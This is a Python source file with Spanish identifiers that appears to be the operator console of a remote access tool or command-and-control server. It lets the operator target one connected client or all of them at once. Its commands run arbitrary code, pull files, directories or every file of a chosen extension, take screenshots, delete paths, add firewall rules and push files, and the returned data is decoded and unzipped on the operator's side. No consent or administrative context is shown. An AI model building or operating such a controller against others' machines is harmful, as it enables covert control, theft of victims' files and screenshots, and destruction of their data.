import os
import time
import json
import base64
import zipfile
import tempfile
import io

class ControladorServidor:
    def __init__(self, servidor_socket):
        self.servidor_socket = servidor_socket
        self.servidor_socket.establecer_controlador(self)
        self.cliente_seleccionado = None
        
        self.manejadores_respuestas = {
            "respuesta_ejecucion": self._procesar_respuesta_ejecucion,
            "archivo_recibido": self._procesar_archivo_recibido,
            "archivo_enviado": self._procesar_archivo_enviado,
            "error": self._procesar_error,
            "respuesta_listado": self._procesar_respuesta_listado,
            "directorio_enviado": self._procesar_directorio_enviado,
            "eliminacion_exitosa": self._procesar_eliminacion_exitosa,
            "captura_enviada": self._procesar_captura_enviada,
            "regla_firewall_agregada": self._procesar_regla_firewall_agregada,
            "archivos_extension_enviados": self._procesar_archivos_extension_enviados
        }
    
    def seleccionar_cliente(self, id_cliente):
        for cliente in self.servidor_socket.clientes:
            if cliente["id"] == id_cliente:
                self.cliente_seleccionado = id_cliente
                print(f"[+] Cliente {id_cliente} seleccionado ({cliente['direccion'][0]}:{cliente['direccion'][1]})")
                return True
        print(f"[!] Cliente con ID {id_cliente} no encontrado")
        return False
    
    def deseleccionar_cliente(self):
        self.cliente_seleccionado = None
        print("[+] Modo broadcast activado (todos los clientes)")
    
    def obtener_cliente_seleccionado(self):
        return self.cliente_seleccionado
    
    def _enviar_comando(self, mensaje):
        if self.cliente_seleccionado:
            return self.servidor_socket.enviar_a_cliente(self.cliente_seleccionado, mensaje)
        else:
            self.servidor_socket.enviar_comando_todos(mensaje)
            return True
    
    def _obtener_etiqueta_cliente(self, cliente):
        return f"[Cliente {cliente['direccion'][0]}]"
    
    def procesar_respuesta_cliente(self, datos, cliente):
        try:
            datos_dict = json.loads(datos)
            accion = datos_dict.get("accion")
            cliente_id = self._obtener_etiqueta_cliente(cliente)
            
            if accion in self.manejadores_respuestas:
                self.manejadores_respuestas[accion](datos_dict, cliente_id)
            else:
                print(f"\n{cliente_id} Respuesta desconocida: {accion}")
                
        except json.JSONDecodeError:
            print(f"[!] Error al decodificar respuesta del cliente: {datos}")
        except Exception as e:
            print(f"[!] Error al procesar respuesta del cliente: {e}")
    
    def _guardar_archivo_base64(self, datos_base64, ruta_destino):
        directorio = os.path.dirname(ruta_destino)
        if directorio and not os.path.exists(directorio):
            os.makedirs(directorio)
        
        with open(ruta_destino, "wb") as f:
            f.write(base64.b64decode(datos_base64))
    
    def _extraer_zip_base64(self, datos_zip_base64, ruta_destino):
        if not os.path.exists(ruta_destino):
            os.makedirs(ruta_destino)
        
        with zipfile.ZipFile(io.BytesIO(base64.b64decode(datos_zip_base64)), 'r') as zip_ref:
            zip_ref.extractall(ruta_destino)
    
    def _procesar_respuesta_ejecucion(self, datos_dict, cliente_id):
        print(f"\n{cliente_id} Resultado de ejecución:")
        print(datos_dict.get("resultado", "Sin resultado"))
    
    def _procesar_archivo_recibido(self, datos_dict, cliente_id):
        print(f"\n{cliente_id} Archivo guardado: {datos_dict.get('ruta_destino')}")
    
    def _procesar_archivo_enviado(self, datos_dict, cliente_id):
        try:
            ruta_destino = datos_dict.get("ruta_destino")
            datos_archivo = datos_dict.get("datos_archivo")
            
            self._guardar_archivo_base64(datos_archivo, ruta_destino)
            print(f"\n{cliente_id} Archivo recibido y guardado en: {ruta_destino}")
            
        except Exception as e:
            print(f"\n{cliente_id} Error al procesar archivo: {str(e)}")
    
    def _procesar_error(self, datos_dict, cliente_id):
        print(f"\n{cliente_id} Error: {datos_dict.get('mensaje')}")
    
    def _procesar_respuesta_listado(self, datos_dict, cliente_id):
        print(f"\n{cliente_id} Estructura del directorio '{datos_dict.get('ruta')}':")
        print(datos_dict.get("estructura"))
    
    def _procesar_directorio_enviado(self, datos_dict, cliente_id):
        try:
            nombre_directorio = datos_dict.get("nombre_directorio")
            ruta_destino = datos_dict.get("ruta_destino")
            datos_zip = datos_dict.get("datos_zip")
            ruta_origen = datos_dict.get("ruta_origen")
            
            ruta_destino_completa = os.path.join(ruta_destino, nombre_directorio)
            self._extraer_zip_base64(datos_zip, ruta_destino_completa)
            
            print(f"\n{cliente_id} Directorio recibido y extraído en: {ruta_destino_completa}")
            print(f"{cliente_id} Directorio origen: {ruta_origen}")
            
        except Exception as e:
            print(f"\n{cliente_id} Error al procesar directorio: {str(e)}")
    
    def _procesar_eliminacion_exitosa(self, datos_dict, cliente_id):
        tipo_elemento = datos_dict.get("tipo", "elemento")
        ruta_eliminada = datos_dict.get("ruta")
        mensaje = datos_dict.get("mensaje")
        
        print(f"\n{cliente_id} ✅ Eliminación exitosa:")
        print(f"{cliente_id} Tipo: {tipo_elemento.capitalize()}")
        print(f"{cliente_id} Ruta: {ruta_eliminada}")
        print(f"{cliente_id} {mensaje}")
    
    def _procesar_captura_enviada(self, datos_dict, cliente_id):
        try:
            ruta_destino = datos_dict.get("ruta_destino")
            datos_imagen = datos_dict.get("datos_imagen")
            ancho = datos_dict.get("ancho", 0)
            alto = datos_dict.get("alto", 0)
            
            self._guardar_archivo_base64(datos_imagen, ruta_destino)
            
            print(f"\n{cliente_id} 📸 Captura de pantalla guardada:")
            print(f"{cliente_id} Archivo: {ruta_destino}")
            print(f"{cliente_id} Resolución: {ancho}x{alto} píxeles")
            print(f"{cliente_id} Tamaño: {os.path.getsize(ruta_destino)} bytes")
            
        except Exception as e:
            print(f"\n{cliente_id} Error al guardar captura de pantalla: {str(e)}")
    
    def _procesar_regla_firewall_agregada(self, datos_dict, cliente_id):
        nombre_regla = datos_dict.get("nombre_regla")
        ip = datos_dict.get("ip")
        puerto = datos_dict.get("puerto")
        accion_firewall = datos_dict.get("accion_firewall")
        resultado = datos_dict.get("resultado")
        
        print(f"\n{cliente_id} Regla de Firewall procesada:")
        print(f"{cliente_id} Nombre: {nombre_regla}")
        print(f"{cliente_id} IP: {ip}")
        print(f"{cliente_id} Puerto: {puerto}")
        print(f"{cliente_id} Acción: {accion_firewall}")
        print(f"{cliente_id} Resultado:")
        print(f"{cliente_id} {resultado}")
    
    def _procesar_archivos_extension_enviados(self, datos_dict, cliente_id):
        try:
            extension = datos_dict.get("extension")
            cantidad_archivos = datos_dict.get("cantidad_archivos")
            ruta_destino = datos_dict.get("ruta_destino")
            datos_zip = datos_dict.get("datos_zip")
            archivos_incluidos = datos_dict.get("archivos_incluidos", [])
            
            cliente_ip = cliente_id.replace('[Cliente ', '').replace(']', '')
            carpeta_extraccion = os.path.join(ruta_destino, f"cliente_{cliente_ip}_{extension.replace('.', '')}")
            
            self._extraer_zip_base64(datos_zip, carpeta_extraccion)
            
            print(f"\n{cliente_id} 📁 Archivos por extensión procesados:")
            print(f"{cliente_id} Extensión: {extension}")
            print(f"{cliente_id} Cantidad de archivos: {cantidad_archivos}")
            print(f"{cliente_id} Archivos extraídos en: {carpeta_extraccion}")
            
            if len(archivos_incluidos) <= 10:
                print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos)}")
            else:
                print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos[:10])}... y {len(archivos_incluidos)-10} más")
            
        except Exception as e:
            print(f"\n{cliente_id} Error al procesar archivos por extensión: {str(e)}")
    
    def enviar_comando_ejecutar(self, codigo):
        mensaje = {"accion": "ejecutar", "codigo": codigo}
        self._enviar_comando(mensaje)
    
    def enviar_comando_solicitar_archivo(self, ruta_origen, ruta_destino):
        mensaje = {
            "accion": "enviar_archivo",
            "ruta_origen": ruta_origen,
            "ruta_destino": ruta_destino
        }
        self._enviar_comando(mensaje)
    
    def enviar_comando_solicitar_directorio(self, ruta_origen, ruta_destino):
        mensaje = {
            "accion": "enviar_directorio",
            "ruta_origen": ruta_origen,
            "ruta_destino": ruta_destino
        }
        self._enviar_comando(mensaje)
    
    def enviar_comando_listar_directorio(self, ruta, incluir_archivos=False):
        mensaje = {
            "accion": "listar_directorio",
            "ruta": ruta,
            "incluir_archivos": incluir_archivos
        }
        self._enviar_comando(mensaje)
    
    def enviar_comando_eliminar(self, ruta):
        mensaje = {
            "accion": "eliminar",
            "ruta": ruta,
            "tipo": "auto"
        }
        self._enviar_comando(mensaje)
    
    def enviar_comando_captura_pantalla(self, ruta_destino, nombre_archivo=None):
        if not nombre_archivo:
            nombre_archivo = f"captura_{int(time.time())}.png"
        
        ruta_completa = os.path.join(ruta_destino, nombre_archivo)
        
        mensaje = {
            "accion": "captura_pantalla",
            "ruta_destino": ruta_completa,
            "nombre_archivo": nombre_archivo
        }
        self._enviar_comando(mensaje)
    
    def enviar_comando_agregar_firewall(self, nombre_regla, ip="any", puerto=None, accion="block"):
        if not nombre_regla or not puerto:
            print("[!] Error: Nombre de regla y puerto son obligatorios")
            return False
        
        if accion not in ("allow", "block"):
            print("[!] Error: La acción debe ser 'allow' o 'block'")
            return False
        
        mensaje = {
            "accion": "agregar_regla_firewall",
            "nombre_regla": nombre_regla,
            "ip": ip,
            "puerto": str(puerto),
            "accion_firewall": accion
        }
        
        self._enviar_comando(mensaje)
        return True
    
    def enviar_comando_solicitar_archivos_por_extension(self, ruta_directorio, extension, ruta_destino):
        if not extension.startswith('.'):
            extension = '.' + extension
        
        mensaje = {
            "accion": "enviar_archivos_por_extension",
            "ruta_directorio": ruta_directorio,
            "extension": extension,
            "ruta_destino": ruta_destino
        }
        self._enviar_comando(mensaje)
    
    def enviar_archivo_a_clientes(self, ruta_origen, ruta_destino):
        try:
            if not os.path.isfile(ruta_origen):
                print(f"[!] El archivo no existe: {ruta_origen}")
                return False
                
            with open(ruta_origen, "rb") as f:
                datos_archivo = base64.b64encode(f.read()).decode()
                
            nombre_archivo = os.path.basename(ruta_origen)
            mensaje = {
                "accion": "recibir_archivo",
                "nombre_archivo": nombre_archivo,
                "ruta_destino": os.path.join(ruta_destino, nombre_archivo),
                "datos_archivo": datos_archivo
            }
            
            self._enviar_comando(mensaje)
            return True
            
        except Exception as e:
            print(f"[!] Error al enviar archivo: {e}")
            return False
    
    def obtener_clientes_conectados(self):
        return len(self.servidor_socket.clientes)
    
    def obtener_info_clientes(self):
        return [(cliente['id'], cliente['direccion'][0], cliente['direccion'][1]) 
                for cliente in self.servidor_socket.clientes]
    
    def listar_clientes(self):
        if not self.servidor_socket.clientes:
            print("\n[!] No hay clientes conectados")
            return
        
        print("\n=== CLIENTES CONECTADOS ===")
        for cliente in self.servidor_socket.clientes:
            marca = "➤" if self.cliente_seleccionado == cliente["id"] else " "
            print(f"{marca} ID: {cliente['id']} | IP: {cliente['direccion'][0]}:{cliente['direccion'][1]}")
        
        if self.cliente_seleccionado:
            print(f"\n[*] Cliente seleccionado: {self.cliente_seleccionado}")
        else:
            print("\n[*] Modo: Broadcast (todos los clientes)")
        print("="*30)